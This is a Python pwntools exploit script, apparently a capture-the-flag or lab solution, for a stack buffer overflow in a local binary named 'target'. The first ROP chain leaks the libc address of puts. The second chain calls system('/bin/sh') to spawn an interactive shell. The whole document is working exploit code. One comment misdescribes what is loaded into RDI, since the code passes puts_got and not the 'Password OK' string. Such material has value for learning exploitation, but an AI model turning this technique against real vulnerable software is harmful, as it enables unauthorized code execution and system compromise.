from pwn import *

context.update(arch='x86_64', os='linux')

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
target = ELF("./target")

password_ok_addr = next(target.search(b'Password OK :)'))
puts_got = target.got['puts']
puts_plt = target.plt['puts']
start_addr = target.symbols['start'] # vulnerable function

payload = b'A' * 40
payload += p64(0x00000000004008d3) # overwrite ret address to POP RDI; RET
payload += p64(puts_got) # set RDI to point to "Password OK :)" string
payload += p64(puts_plt) # after POP RDI; RET pops this address from the stack and jumps to it
payload += p64(start_addr)

p = process("./target")
log.info('Leaking libc puts() address...')

p.clean() # read app banner + password prompt
p.sendline(payload)
p.recvline() # read "Wrong password" msg

leaked_libc_puts_addr = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f'Leaked libc puts addr: {hex(leaked_libc_puts_addr)}')

libc_base = leaked_libc_puts_addr - libc.symbols['puts']
log.info(f'Got libc base address: {hex(libc_base)}')

# second ROP, now exec system('/bin/sh')
libc_system = libc_base + libc.symbols['system']
libc_exit = libc_base + libc.symbols['exit']
libc_bin_sh_str = libc_base + next(libc.search(b"/bin/sh\x00"))
log.info(f'Libc system address is 0x{libc_system:x}')
log.info(f'Libc exit address is 0x{libc_exit:x}')
log.info(f'/bin/sh string address is 0x{libc_bin_sh_str:x}')

log.info('Spwaning a shell using a second ROP chain...')
payload = b'A' * 40
payload += p64(0x00000000004005e6) # DUMMY RET to align RSP reg to 16 byte value, as required by system@libc in x86_64
payload += p64(0x00000000004008d3) # POP RDI; RET
payload += p64(libc_bin_sh_str)
payload += p64(libc_system)
payload += p64(0x00000000004008d3) # POP RDI; RT
payload += p64(0) # exit code (argument to exit())
payload += p64(libc_exit) # exit(0)

p.clean() # read app banner + password prompt
p.sendline(payload)
p.readline() # read invalid password msg
p.interactive()

